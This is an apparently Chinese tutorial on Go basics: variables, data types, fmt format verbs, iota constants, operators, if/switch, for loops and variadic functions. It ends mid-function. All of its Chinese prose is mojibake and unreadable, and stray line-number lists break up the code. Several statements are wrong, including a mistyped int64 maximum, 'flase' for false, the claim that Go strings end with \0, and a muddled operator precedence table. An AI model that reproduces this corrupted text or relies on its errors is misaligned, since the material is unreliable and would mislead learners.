åé\n\nå£°æï¼Goè¯­è¨ä¸­ä½¿ç¨varè¿è¡åéçå£°æï¼åéå£°æçæ ¼å¼å¦ä¸ï¼æ³¨æï¼å¨Goè¯­è¨ä¸­ï¼åéå£°æä¹åå¿é¡»è¦ä½¿ç¨ã\n\nvar a int\nvar b int\nvar c, d int\nprint(a, b, c, d) // 0000\n\n\n1\n2\n3\n4\n\n\nåå§åï¼å¨å£°æåéçåæ¶ï¼å¯ä»¥å¯¹æè¿è¡åå§åï¼å¦ææ²¡æè¿è¡åå§åï¼åGOè¯­è¨ä¼ç»åéä¸ä¸ªé»è®¤çå¼ã\n\n\tvar a int = 10\n\n\n1\n\n\nèµå¼ï¼åºäºå¨å£°æåéçæ¶åå®æåéçåå§åä»¥å¤ï¼è¿å¯ä»¥å¨åéå®ä¹ä¹ååéèµå¼ï¼åå£°æåèµå¼çæ¨¡å¼ï¼\n\nvar a int\na = 10\nprint(a)\n\n\n1\n2\n3\n\n\nèªå¨æ¨å¯¼ç±»åï¼æä»¬å¨å£°æåéçæ¶åä¹å¯ä»¥ä¸æå®åéçç±»åï¼æ ¹æ®åéåé¢çèµå¼è¯­å¥ç±goèªå·±æ¨å¯¼å½ååéçç±»åï¼\n\na := "abc"\nprint(a)            // 10 +1.000000e+001 abc\nfmt.Printf("%T", a) // int float64 string\n\n\n1\n2\n3\n\n\nå¤éèµå¼ï¼å½æä»¬éè¦ç»å¤ä¸ªåéèµå¼æ¶ï¼å¯ä»¥ä½¿ç¨å¤éèµå¼çæ¹å¼ãå¤éèµå¼åæ ·æ¯æèªå¨ç±»åæ¨å¯¼ã\n\na, b, c, d := 1, 1.1, "aaa", \'a\'\nfmt.Println(a, b, c, d)\nfmt.Printf("%T\\t%T\\t%T\\t%T\\n", a, b, c, d)\n\n//1 1.1 aaa 97\n//int     float64 string  int32\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¿ååéï¼æä»¬å¯ä»¥ä½¿ç¨_å»æ¥æ¶ä¸ä¸ªæä»¬ä¸æ³è¦çåéï¼è¿ä¸ªå¨åé¢çå½æ°è°ç¨æ¥æ¶è¿åå¼çæ¶åéå¸¸æç¨ï¼è¿éè®°ä½å°±å¥½ã\n\na, _, b, _, c := 1, 2, 3, 4, 5\nfmt.Println(a, b, c)\n// 1 3 5\n\n\n1\n2\n3\n\n\næå°è¾åºï¼å¨Goè¯­è¨ä¸­æå¤ç§è¾åºæ¹å¼ï¼ç¬¬ä¸ç§è¾åºæ¹å¼æ¯éç¨fmt.Printlnçæ¹å¼ï¼è¿ç§è¾åºä¼å°åæ°æå°åºæ¥ï¼å¹¶æ¢è¡ãè¿æä¸ç§æ¯fmt.Printfè¿ç§è¾åºæ¹å¼å¯ä»¥å®ä¹è¾åºçæ ¼å¼ï¼ç±»ä¼¼äºCè¯­è¨ä¸­çprintf()ã\n\na := 10\nb := 20\nfmt.Println("a=", a, ",b=", b) //a= 10 ,b= 20\n\n\n1\n2\n3\n\n\næ ¼å¼åè¾åºçç¸å³è¯­æ³åå ä½ç¬¦å¨åé¢fmtç¸å³çç« èä¸­ä»ç»ã\n\næ¥æ¶è¾å¥ï¼åºäºå¯ä»¥è¾åºåå®¹ï¼è¿å¯ä»¥ä»æ§å¶å°ä¸æ¥åç¨æ·è¾å¥çå¼ï¼å­å¨å°åéä¸­ãåCå¾åã\n\nvar age int\nfmt.Scanf("%d", &age)\nfmt.Println("age=", age)\n\n// 20\n//age= 20\n\n\n1\n2\n3\n4\n5\n6\n\n\nå¦å¤ä¸ç§è·åç¨æ·è¾å¥çæ¹å¼æ¯ç´æ¥ä½¿ç¨fmt.Scanï¼\n\nvar age int\nfmt.Scan(&age)\n\nfmt.Println("age=", age)\n\n//30\n//age= 30\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æ°æ®ç±»å\n\nGoè¯­è¨ä¸­æå¤ç§æ°æ®ç±»åãå¦ä¸è¡¨æç¤ºï¼\n\nç±»å          åç§°     é¿åº¦   é¶å¼      è¯´æ\nbool        å¸å°ç±»å   1    false   å¶å¼ä¸ä¸ºçå³ä¸ºåï¼ä¸å¯ä»¥ç¨æ°å­ä»£è¡¨trueæfalse\nbyte        å­èå    1    0       uint8å«å\nint, uint   æ´å     -    0       æç¬¦å·32ä½ææ ç¬¦å·64ä½\nint8        æ´å     1    0       -128 ~ 127,\nuint8       æ´å     1    0       0 ~ 255\nint16       æ´å     2    0       -32768 ~ 32767,\nuint16      æ´å     2    0       0 ~ 65535\nint32       æ´å     4    0       -2147483648 å° 2147483647\nuint32      æ´å     4    0       0 å° 4294967295(42äº¿)\nint64       æ´å     8    0       -9223372036854775808å° 92233720368547758070\nuint64      æ´å     8    0       å° 18446744073709551615(1844äº¬)\nfloat32     æµ®ç¹å    4    0.0     å°æ°ä½ç²¾ç¡®å°7ä½\nfloat64     æµ®ç¹å    8    0.0     å°æ°ä½ç²¾ç¡®å°15ä½\nstring      å­ç¬¦ä¸²         ""      utf-8å­ç¬¦ä¸²\n\n# 1. boolç±»å\n\nè¿ä¸ªç±»åç¨äºè¡¨ç¤ºå¯¹è¿æ¯éï¼å¸¸ç¨å¨å¤æ­ä¸ãætrueåfalseä¸¤ç§å¼ã\n\n// ä½¿ç¨èªå¨æ¨å¯¼ç±»å\nb := true\nfmt.Println("b=", b)\nfmt.Printf("b= %t\\n", b)\n//b= true\n//b= true\n\nvar b bool\nb = false\nfmt.Printf("b= %t\\n Type of b is %T", b, b)\n//b= false\n// Type of b is bool\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 2. æµ®ç¹ç±»å\n\nå¨Goè¯­è¨ä¸­æä¸¤ç§æµ®ç¹æ°çç±»åï¼float32ãfloat64ãé»è®¤ä½¿ç¨èªå¨æ¨å¯¼ç±»åå¾å°çæ¯ä¸ä¸ªfloat64çæµ®ç¹æ°ã\n\nvar f float32\nf = 1.2\nfmt.Printf("%.2f\\n", f)\n\nf2 := 1.2\nfmt.Printf("f2= %f\\nType of f2 is %T", f2, f2)\n\n//1.20\n//f2= 1.200000\n//Type of f2 is float64\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 3. å­ç¬¦ç±»å\n\nGoè¯­è¨ä¸­çå­ç¬¦ç±»åå®éä¸å­å¨çæ¯å­ç¬¦çASCIIç ï¼å æ­¤å¯ä»¥åæ°å­è¿è¡æ¿æ¢ãå¨å®ä¹çæ¶åä¹æ¯ä½¿ç¨çæ°å­ç±»åbyteï¼unit8ç±»åçå«åï¼ãå¦ä¸çä¾å­æç¤ºï¼\n\nvar a byte\na = \'a\'\nfmt.Printf("%c\\n", a) //a\nfmt.Printf("%d", a) // 97\n\n\n1\n2\n3\n4\n\n\n\n\n# 4. å­ç¬¦ä¸²ç±»å\n\nå­ç¬¦ä¸²ç±»åå®éä¸æ¯å¤ä¸ªå­ç¬¦ç±»åçè¿ç»­ï¼æ¯å­ç¬¦çæ°ç»ãå­ç¬¦ä½¿ç¨åå¼å·èå­ç¬¦ä¸²ä½¿ç¨çæ¯åå¼å·ã\n\nvar str string\nstr = "hello world"\nfmt.Printf("%s", str) // hello world\n\n\n1\n2\n3\n\n\nå­ç¬¦ä¸²ç±»åä¹å¯ä»¥ä½¿ç¨Scanè¾å¥ï¼\n\nvar str string\nfmt.Scanf("%s", &str) //hello world haha\nfmt.Println(str)  //hello\n\n\n1\n2\n3\n\n\nå¨è¾å¥çæ¶åï¼é»è®¤æ¯ä»¥ç©ºæ ¼ãæ¢è¡ä½ä¸ºåå²ç¬¦ï¼å æ­¤åªæhelloè¢«æ¥æ¶äºã\n\n# å­ç¬¦åå­ç¬¦ä¸²çåºå«\n\n 1. å­ç¬¦ä½¿ç¨åå¼å·ãå­ç¬¦ä¸²ä½¿ç¨åå¼å·\n 2. è½¬ä¹ç¬¦å·ä¹æ¯ä¸ä¸ªå­ç¬¦\n 3. å­ç¬¦ä¸²åé¢ä¼æä¸ä¸ª\\0\n\nc := \'a\'\nstr := "a"\nfmt.Printf("type of c is %T\\n", c)\nfmt.Printf("type of str is %T\\n", str)     \nfmt.Printf("len of str is %d\\n", len(str))\nfmt.Printf("str[1]: %c\\n", str[0])         \n//type of c is int32\n//type of str is string\n//len of str is 1\n//str[1]: a\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# fmtè¾å¥è¾åºçæ ¼å¼\n\nå¨ä¸é¢å¦ä»¬ä½¿ç¨å°äºfmt.Printfãfmt.Scanfè¾åºåè¾å¥åå®¹ï¼å¨è¿äºå¯ä»¥ä½¿ç¨ä¸äºç¹æ®çå ä½ç¬¦ï¼ç¨äºè¡¨ç¤ºä¸åçæ ¼å¼åæ°æ®ç±»åï¼å¦ä¸è¡¨æç¤ºï¼\n\næ ¼å¼   å«ä¹\n%%   ä¸ä¸ª%å­é¢é\n%b   ä¸ä¸ªäºè¿å¶æ´æ°å¼(åºæ°ä¸º2)ï¼æèæ¯ä¸ä¸ª(é«çº§ç)ç¨ç§å­¦è®¡æ°æ³è¡¨ç¤ºçææ°ä¸º2çæµ®ç¹æ°\n%c   å­ç¬¦åãå¯ä»¥æè¾å¥çæ°å­æç§ASCIIç ç¸åºè½¬æ¢ä¸ºå¯¹åºçå­ç¬¦\n%d   ä¸ä¸ªåè¿å¶æ°å¼(åºæ°ä¸º10)\n%f   ä»¥æ åè®°æ°æ³è¡¨ç¤ºçæµ®ç¹æ°æèå¤æ°å¼\n%o   ä¸ä¸ªä»¥å«è¿å¶è¡¨ç¤ºçæ°å­(åºæ°ä¸º8)\n%p   ä»¥åå­è¿å¶(åºæ°ä¸º16)è¡¨ç¤ºçä¸ä¸ªå¼çå°åï¼åç¼ä¸º0x,å­æ¯ä½¿ç¨å°åça-fè¡¨ç¤º\n%q   ä½¿ç¨Goè¯­æ³ä»¥åå¿é¡»æ¶ä½¿ç¨è½¬ä¹ï¼ä»¥åå¼å·æ¬èµ·æ¥çå­ç¬¦ä¸²æèå­èåç[]byteï¼æèæ¯ä»¥åå¼å·æ¬èµ·æ¥çæ°å­\n%s   å­ç¬¦ä¸²ãè¾åºå­ç¬¦ä¸²ä¸­çå­ç¬¦ç´è³å­ç¬¦ä¸²ä¸­çç©ºå­ç¬¦ï¼å­ç¬¦ä¸²ä»¥\'\\0âç»å°¾ï¼è¿ä¸ª\'\\0\'å³ç©ºå­ç¬¦ï¼\n%t   ä»¥trueæèfalseè¾åºçå¸å°å¼\n%T   ä½¿ç¨Goè¯­æ³è¾åºçå¼çç±»å\n%x   ä»¥åå­è¿å¶è¡¨ç¤ºçæ´åå¼(åºæ°ä¸ºåå­)ï¼æ°å­a-fä½¿ç¨å°åè¡¨ç¤º\n%X   ä»¥åå­è¿å¶è¡¨ç¤ºçæ´åå¼(åºæ°ä¸ºåå­)ï¼æ°å­A-Fä½¿ç¨å°åè¡¨ç¤º\n\n\tfmt.Printf("%%\\n")\n\tfmt.Printf("%b\\n", 4)\n\tfmt.Printf("%c\\n", 97)\n\tfmt.Printf("%d\\n", 97)\n\tfmt.Printf("%f\\n", 1.1)\n\tfmt.Printf("%o\\n", 16)\n\tfmt.Printf("%p\\n", 16)\n\tfmt.Printf("%q\\n", \'1\')\n\tfmt.Printf("%s\\n", "helloworld")\n\tfmt.Printf("%t\\n", false)\n\tfmt.Printf("%T\\n", false)\n\tfmt.Printf("%x\\n", 16)\n\tfmt.Printf("%X\\n", 16)\n\t\n\t//%\n\t//100\n\t//a\n\t//97\n\t//1.100000\n\t//20\n\t//%!p(int=16)\n\t//\'1\'\n\t//helloworld\n\t//false\n\t//bool\n\t//10\n\t//10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# å¸¸é\n\nåéåå¸¸éä¸åï¼åéå¨å®ä¹ååå§åä¹åï¼å¯ä»¥æ¹ååéçå¼ãèå¸¸éä¸æ¦å®ä¹å°±ä¸è½æ¹åå¼äºã\n\nvar a int\na = 10\na = 20\n\nconst b int = 20\n//b = 30 // éè¯¯\n\n\n1\n2\n3\n4\n5\n6\n\n\n**å­é¢å¸¸é **ï¼å¨ä»£ç ä¸­ç¡¬ç¼ç çå¸¸éï¼æä»¬ç»åéèµå¼æ¶å¼ãå­ç¬¦ä¸²çåå®¹ç­é½æ¯å­é¢å¸¸éã\n\n"abc"\n123\n1.1\nflase\n\n\n1\n2\n3\n4\n\n\niotaæä¸¾ iotaæä¸¾æ¯ä¸ä¸ªå¸¸éççæå¨ï¼å¯ä»¥çæä¸ç»æè§å¾çå¸¸éï¼èä¸ç¨æ¯ä¸è¡é½åä¸ä¸ªå¸¸éçåå§åè¡¨è¾¾å¼ãè¯­æ³æ¯ï¼å¨ç¬¬ä¸ä¸ªå£°æçåéæå¨çè¡ï¼iotaçå¼æ¯0ï¼æ¯å¤ä¸ä¸ªå¸¸éåå ä¸ã\n\nconst (\n  a = iota\n  b = iota\n  c = iota\n)\nfmt.Println(a, b, c) // 0 1 2\n\n\n1\n2\n3\n4\n5\n6\n\n\nä¹å¯ä»¥åªåä¸ä¸ªiotaã\n\nconst (\n  a = iota\n  b\n  c\n  d\n)\nfmt.Println(a, b, c, d) // 0 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¦æiotaå¨åä¸ä¸ªå±çº§ï¼åè¿ä¸è¡çå¼ä¸æ ·ã\n\nconst (\n  a       = iota\n  b, c, d = iota, iota, iota\n  e       = iota\n  f       = iota\n)\nfmt.Println(a, b, c, d, e, f) // 0 1 1 1 2 3\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# è¿ç®ç¬¦\n\nä¸é¢ä¸èä»ç»äºGoè¯­è¨ä¸­å¤ç§æ°æ®ç±»åï¼è¿ä¸èæ¯ä½¿ç¨ä¸åçè¿ç®ç¬¦å¯¹ä¸é¢æå°çæ°æ®ç±»åè¿è¡è¿ç®ãæäºæä½ç¬¦è¿äºç®åï¼å¶ä»è¯­è¨ä¸­ä¹é½æç±»ä¼¼çå®ä¹ï¼è¿éå°±ä¸èµè¿°äºã\n\n# 1. ç®æ°è¿ç®ç¬¦\n\nè¿ç®ç¬¦   æ¯è¯­          ç¤ºä¾         ç»æ\n+     å            10 + 5     15\n-     å           10 - 5     5\n*     ä¹           10 * 5     50\n/     é¤           10 / 5     2\n%     åæ¨¡(åä½)      10 % 3     1\n++    åèªå¢ï¼æ²¡æåèªå¢   a=0; a++   a=1\n--    åèªåï¼æ²¡æåèªå   a=2; a--   a=1\n\n# 2. ç±»åè½¬æ¢\n\nGoè¯­è¨ä¸­ä¸åè®¸éå¼è½¬æ¢ï¼ææç±»åè½¬æ¢å¿é¡»æ¾å¼å£°æï¼å¼ºå¶è½¬æ¢ï¼ï¼èä¸è½¬æ¢åªè½åçå¨ä¸¤ç§ç¸äºå¼å®¹çç±»åä¹é´ã\n\nå¼ºå¶ç±»åè½¬æ¢çæ¹å¼ï¼æ°æ®ç±»åå(å¾è½¬æ¢çå¼)\n\nå½å¤§å®¹éçæ°æ®è½¬å°å°å®¹éçæ°æ®æ¶ä¼ä¸¢å¤±ç²¾åº¦ï¼ä¾å¦floatè½¬intä¼ä¸¢å¤±ç²¾åº¦ã\n\n# 3. èµå¼è¿ç®ç¬¦\n\nè¿ç®ç¬¦   è¯´æ       ç¤ºä¾\n=     æ®éèµå¼     c = a + b å°a + b è¡¨è¾¾å¼ç»æèµå¼ç» c\n+=    ç¸å ååèµå¼   c += a ç­ä»·äºc = c + a\n-=    ç¸åååèµå¼   c -= a ç­ä»·äºc = c - a\n*=    ç¸ä¹ååèµå¼   c *= a ç­ä»·äº c = c * a\n/=    ç¸é¤ååèµå¼   c /= a ç­ä»·äº c = c / a\n%=    æ±ä½ååèµå¼   c %= a ç­ä»·äº c = c % a\n\n# 4. å³ç³»è¿ç®ç¬¦\n\nå³ç³»è¿ç®ç¬¦éå¸¸ç¨äºæ¯è¾ä¸¤ä¸ªæ°æ®ä¹é´çå³ç³»ï¼å³ç³»è¿ç®ç¬¦çè¿ç®ç»ææ¯boolç±»åãä¸é¢æ¯å¸¸è§çä¸äºå³ç³»è¿ç®ç¬¦ã\n\nè¿ç®ç¬¦   æ¯è¯­     ç¤ºä¾       ç»æ\n==    ç¸ç­äº    4 == 3   false\n!=    ä¸ç­äº    4 != 3   true\n<     å°äº     4 < 3    false\n>     å¤§äº     4 > 3    true\n<=    å°äºç­äº   4 <= 3   false\n>=    å¤§äºç­äº   4 >= 1   true\n\n# 5. é»è¾è¿ç®ç¬¦\n\né»è¾è¿ç®ç¬¦ç¨äºå¯¹boolå¼è¿è¡è¿ç®ï¼æä¸æéä¸ç§è¿ç®ï¼å¨å¶ä»è¯­è¨ä¸­æç­è·¯ä¸ãç­è·¯æç­ï¼å¨goè¯­è¨ä¸­é»è®¤å°±æ¯ç­è·¯ä¸åç­è·¯æã\n\nè¿ç®ç¬¦   æ¯è¯­   ç¤ºä¾       ç»æ\n!     é    !a       å¦æaä¸ºåï¼å!aä¸ºçï¼ å¦æaä¸ºçï¼å!aä¸ºåã\n&&    ä¸    a && b   å¦æaåbé½ä¸ºçï¼åç»æä¸ºçï¼å¦åä¸ºåã\n||    æ    a || b   å¦æaåbæä¸ä¸ªä¸ºçï¼åç»æä¸ºçï¼äºèé½ä¸ºåæ¶ï¼ç»æä¸ºåã\n\nè¿ç®ç»æåè¡¨ï¼\n\né»è¾ä¸ï¼\n\nè¡¨è¾¾å¼1    è¡¨è¾¾å¼2    è¡¨è¾¾å¼1&&è¡¨è¾¾å¼2\nTrue    True    True\nFalse   True    False\nTrue    False   False\nFalse   False   false\n\né»è¾æï¼\n\nè¡¨è¾¾å¼1    è¡¨è¾¾å¼2    è¡¨è¾¾å¼1||è¡¨è¾¾å¼2\nTrue    True    True\nTrue    False   True\nFalse   True    True\nFalse   False   false\n\né»è¾éï¼\n\nè¡¨è¾¾å¼     !è¡¨è¾¾å¼\nTrue    False\nFalse   true\n\n# 6. å¶ä»è¿ç®ç¬¦\n\nè¿ç®ç¬¦   æ¯è¯­       ç¤ºä¾   è¯´æ\n&     åå°åè¿ç®ç¬¦   &a   åéaçå°å\n*     åå¼è¿ç®ç¬¦    *a   æéåéaææååå­çå¼\n\nåé¢å¨æéçä¹åï¼ä¼ä¸é¨ä½¿ç¨å°è¿ä¸¤ç§è¿ç®ç¬¦ã\n\n# 7. è¿ç®ç¬¦çä¼åçº§\n\nä¼åçº§   è¿ç®ç¬¦\n7     ^ !\n6     / % << >>&&^\n5     + - | ^\n4     == != < <= >= >\n3     <-\n2     &&\n1     ||\n\n\n# æµç¨æ§å¶\n\n\n# åæ¯ - éæ©\n\n# if\n\nåå¶ä»çç¼ç¨è¯­è¨ä¸æ ·ï¼å¨Goä¸­å®ç°éæ©ç»æçä¹æ¯Ifè¯­å¥ï¼åªä¸è¿æ ¼å¼ä¸é¢åå¶ä»çè¯­è¨ç¥æå·®å¼ãç¸æ¯èè¨ï¼Goè¯­è¨ä¸­çifè¯­å¥æ¯å¶ä»è¯­è¨ä¸­çifè¯­å¥æ´å çµæ´»ã\n\n//ç¸æ¯å¶ä»è¯­è¨ä¸­æ´çµæ´»çåæ³\n// å¯ä»¥å¨å®ä¹çæ¶å å¤çåé\nif a = 10;a==10 {\n  fmt.Println("a == 10")\n}\n\n\n// if else - else if\nvar score float64\nfmt.Printf("è¯·è¾å¥æ¨çåæ°ï¼")\nfmt.Scanf("%f", &score)\n\nif score >= 90 {\n  fmt.Println("ä¼ç§")\n} else if score >= 80 {\n  fmt.Println("è¯å¥½")\n} else if score >= 60 {\n  fmt.Println("åæ ¼")\n} else {\n  fmt.Println("ç»§ç»­åªå")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# switchç»æ\n\nswitchæä¸¤ç§è¯­æ³æ ¼å¼ï¼å¦ä¸æç¤ºï¼\n\nvar score float64\nfmt.Scanf("%f", &score)\n\nswitch score {\n  case 10:\ncase 20:\n  fmt.Println("20")\n  case 30:\n  fmt.Println("30")\n  case 100:\n  fmt.Println("nice")\n\n  default:\n  fmt.Println("others")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nåå¶ä»è¯­è¨ä¸ä¸æ ·ï¼è¿éçcaseä¸è½å¤å±çç»§æ¿ï¼å¨å¶ä»è¯­è¨ä¸­ï¼ä½¿ç¨breakè¡¨ç¤ºç»æå½åcaseï¼èå¨goè¯­è¨ä¸­ï¼caseé»è®¤å°±åªæä¸å±ã\n\nç¬¬äºç§ç¨æ³æ¯å¨caseåé¢è·ä¸å¤æ­è¡¨è¾¾å¼ï¼\n\nvar score float64\nfmt.Scanf("%f", &score)\nswitch {\n  case score >= 90:\n  fmt.Println("ä¼ç§")\n  case score >= 80:\n  fmt.Println("è¯å¥½")\n  case score >= 60:\n  fmt.Println("åæ ¼")\n  default:\n  fmt.Println("åæ¥åå")\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# å¾ªç¯\n\nå¾ªç¯ç»æé¡¾åæä¹å°±æ¯éå¤çå®ææä¸ä¸ªä»»å¡ï¼å¨å¶ä»è¯­è¨ä¸­å¯è½æwhileãdo-whileãforç­å¤ç§å¾ªç¯çæ ¼å¼ï¼ä½æ¯å¨goè¯­è¨ä¸­ï¼å°±åªæforå¾ªç¯ä¸ç§ã\n\nforå¾ªç¯çè¯­æ³æ ¼å¼å¦ä¸ï¼\n\nfor è¡¨è¾¾å¼1;è¡¨è¾¾å¼2;è¡¨è¾¾å¼3{\n\tå¾ªç¯ä½\n}\nè¡¨è¾¾å¼1:å®ä¹ä¸ä¸ªå¾ªç¯çåéï¼è®°å½å¾ªç¯çæ¬¡æ°\nè¡¨è¾¾å¼2ï¼ä¸è¬ä¸ºå¾ªç¯æ¡ä»¶ï¼å¾ªç¯å¤å°æ¬¡\nè¡¨è¾¾å¼3ï¼ä¸è¬ä¸ºæ¹åå¾ªç¯æ¡ä»¶çä»£ç ï¼ä½¿å¾ªç¯æ¡ä»¶ç»æä¸å¤©ä¸åæç«\nå¾ªç¯ä½ï¼éå¤è¦åçäºæã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä»¥ä¸ä»£ç çæ§è¡é¡ºåºæ¯ï¼\n\nç¶åæ§è¡è¡¨è¾¾å¼2ï¼å¤æ­å¾ªç¯æ¡ä»¶æ¯å¦æç«ï¼å¦æè¡¨è¾¾å¼2è¿åçç»æä¸ºtrueï¼\n\nåæ§è¡å¾ªç¯ä½ãå½æ§è¡å®å¾ªç¯ä½åï¼æ§è¡è¡¨è¾¾å¼3ï¼ç¶åæ§è¡è¡¨è¾¾å¼2ï¼è¿æ¶ä¸ä¼å¨æ§è¡è¡¨è¾¾å¼1ï¼ç»§ç»­å¤æ­å¾ªç¯æ¡ä»¶æ¯å¦æç«ï¼\n\nå¦ææç«åç»§ç»­æ§è¡å¾ªç¯ä½ï¼å¦æä¸æç«ï¼åè·³åºforå¾ªç¯ã\n\nä¸¾ä¾å­ï¼è¾åºåæ¬¡hello world\n\nfor i := 0; i < 10; i++ {\n  fmt.Println("helloworld")\n}\n\n\n1\n2\n3\n\n\næ­»å¾ªç¯ï¼\n\nfor {\n  fmt.Println("helloworld")\n}\n\n\n1\n2\n3\n\n\n\n# è·³è½¬è¯­å¥\n\ncè¯­è¨ä¸­çè·³è½¬è¯­å¥å¸¸å¸¸è®©äººè¯çï¼å ä¸ºå¤ªè¿çµæ´»å¯¼è´ä»£ç å¯è¯»æ§è¾å·®ãGoè¯­è¨ä¸­ä¹æè·³è½¬è¯­å¥ï¼éå¸¸éåbreakãcontinueä½¿ç¨ã\n\n# break\n\nåé¢æä»¬åäºä¸ä¸ªæ­»å¾ªç¯ï¼å¦ææ³å¨å¾ªç¯éé¢ç»æè¿ä¸ªå¾ªç¯ï¼åéè¦ç¨å°breakãå¦ä¸æç¤ºï¼\n\nvar i int = 0\n\nfor {\n  i += 20\n  fmt.Println(i)\n  if i%3 == 0 {\n    fmt.Println(i)\n    break\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nBreakçä½ç¨æ¯è·³åºå¾ªç¯ãècontinueçä½ç¨æ¯è·³åºå½åå¾ªç¯ï¼è¿è¡ä¸ä¸æ¬¡å¾ªç¯ãå¦ä¸æç¤ºï¼\n\nvar i int = 0\nfor {\n  i += 20\n  fmt.Println("i = ", i)\n  if i%3 == 0 {\n    fmt.Println("i % 3== 0")\n    continue\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¾ªç¯åµå¥\n\nç´æ¥æå°ä¸ä¸ªä¹ä¹ä¹æ³è¡¨ï¼\n\nfor i := 1; i <= 9; i++ {\n  for j := 1; j <= i; j++ {\n    fmt.Printf("%d*%d=%d\\t", j, i, i*j)\n  }\n  fmt.Println()\n}\n\n//1*1=1   \n//1*2=2   2*2=4   \n//1*3=3   2*3=6   3*3=9   \n//1*4=4   2*4=8   3*4=12  4*4=16  \n//1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  \n//1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  \n//1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  \n//1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64  \n//1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# å½æ°\n\nå½æ°å°±æ¯å°ä¸å ä»£ç è¿è¡éç¨çä¸ç§æºå¶ãå½æ°å°±æ¯ä¸æ®µä»£ç ï¼ä¸ä¸ªå½æ°å°±åä¸ä¸ªä¸é¨åè¿ä»¶äºçäººï¼æä»¬è°ç¨å®æ¥åä¸äºäºæï¼å®å¯è½éè¦æä»¬æä¾ä¸äºæ°æ®ç»å®ï¼å®æ§è¡å®æåå¯è½ä¼æä¸äºæ§è¡ç»æç»æä»¬ãè¦æ±çæ°æ®å°±å«åæ°ï¼è¿åçæ§è¡ç»æå°±æ¯è¿åå¼ã\n\n\n# åæ°åè¡¨\n\n# æ®éåæ°åè¡¨\n\næ®éåæ°åè¡¨çåæ°æ°éæ¯ç¡®å®çã\n\nfunc Test(a int, b int) {\n\tfmt.Println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n\n\nå¯¹äºå¤ä¸ªåç±»åçåæ°å¯ä»¥ç®åï¼\n\n// è¿æ ·åä¸æ¸æ°\nfunc Test(a,b int, str string ,f1,f2 float64) {\n\tfmt.Println("a=", a, ",b=", b)\n}\n\n\n1\n2\n3\n4\n\n\n# ä¸å®åæ°\n\nä¸å®åæ°æ¯æå¨ä¼ éåæ°æ¶ï¼åæ°çä¸ªæ°æ æ³ç¡®å®ãæä»¬å¯ä»¥ä½¿ç¨â¦çæ¹å¼ä»£è¡¨è¿éæå¤ä¸ªåæ°ãæ¥æ¶å°çåæ°ä»¥æ°ç»çå½¢å¼å­å¨ãå¦ä¸æç¤ºï¼\n\nfunc Test(args ...int) {\n  for i := 0; i < len(args); i++ {\n    fmt.Printf("args[%d]=%d\\n", i, args[i])\n  }\n}\n\nfunc main() {\n  Test(1, 2, 3, 4, 5, 1, 1, 1, 1)\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä½¿ç¨rangeéåä¸å®åæ°ï¼è¿éä½¿ç¨äºå¤éèµå¼çæ¹å¼ã\n\nfor i, arg := range args {\n  fmt.Println(i, arg)\n}\n\n\n1\n2\n3\n\n\nå¦æå¨éåè¿ç¨ä¸­ä¸éè¦ç´¢å¼ï¼ä½æ¯å¨Goè¯­è¨ä¸­å£°æçåéå¿é¡»ä½¿ç¨ï¼å æ­¤æä»¬å°±å¯ä»¥ä½¿ç¨å¿ååéå»æ¥åç´¢å¼å¼ã\n\nfunc Test(a int, args ...float64) {\n\tfor _, data := range args {\n\t\tfmt.Println(data)\n\t}\n}\n\n\n1\n2\n3\n4\n5\n\n\néè¦æ³¨æçæ¯ï¼å¨ä½¿ç¨äº ä¸å®åæ°ä¹åï¼å¦æéè¦æ·»å ä¸ä¸ªæå®åç§°çåæ°ï¼åå¿é¡»æ¾å°ä¸å®åæ°ä¹åï¼ä¹å°±æ¯è¯´ï¼ä¸å®åæ°åªè½æ¾å°åæ°åè¡¨çæåé¢ã\n\n// a åªè½æ¾å¨ç¬¬ä¸ä¸ªä½ç½®\nfunc Test(a int , args ... float64)  {\n\tfmt.Println(a,args[0])\n}\n\n\n1\n2\n3\n4\n\n\n\n# å½æ°çåµå¥è°ç¨\n\nåifè¯­å¥å¯ä»¥åµå¥ä¸æ ·ï¼å½æ°ä¹å¯ä»¥åµå¥è°ç¨ï¼æ¯å¦è¯´æä»¬å¨mainå½æ°ä¸­è°ç¨äºæå°å½æ°ï¼å®éä¸ä¹æ¯åµå¥è°ç¨çä¸ç§ãè¿å®éä¸éå¸¸å¥½çè§£åç¼åä»£ç ï¼ä½æ¯éè¦æ³¨æçæ¯ï¼å¨åµå¥è°ç¨å½æ°çæ¶åï¼å½ä¼ éä¸å®åæ°æ¶ï¼éè¦ä½¿ç¨å¦ä¸çåæ³ï¼\n\nfunc Test1(args ...int)  {\n\tTest2(args...)\n}\n\nfunc Test2(args ...int)  {\n\tfor _,data:=range 